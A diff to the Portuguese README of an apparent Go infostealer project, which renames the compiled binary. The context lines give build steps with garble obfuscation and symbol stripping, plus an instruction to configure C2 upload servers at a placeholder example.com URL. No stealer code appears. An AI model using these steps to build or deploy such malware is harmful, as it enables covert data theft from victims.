@@ -13,7 +13,7 @@ Infostealer somente para fins educacionais em Go, projetado para operar furtivam
   ```
 - Compilação com ofuscação:
   ```bash
-  garble -a -tiny build -o infostealer.exe
+  garble -a -tiny build -o infoHaze.exe
   ```
 
 ## Instalação e Uso
@@ -28,7 +28,7 @@ Infostealer somente para fins educacionais em Go, projetado para operar furtivam
    ```
 3. Compile o binário:
    ```bash
-   go build -ldflags "-s -w" -o infostealer infostealer.go
+   go build -ldflags "-s -w" -o infoHaze tika.go
    ```
 4. Configure os servidores C2 no código (substitua `https://backup1.example.com/upload` e outros).
 5. Execute no ambiente controlado:
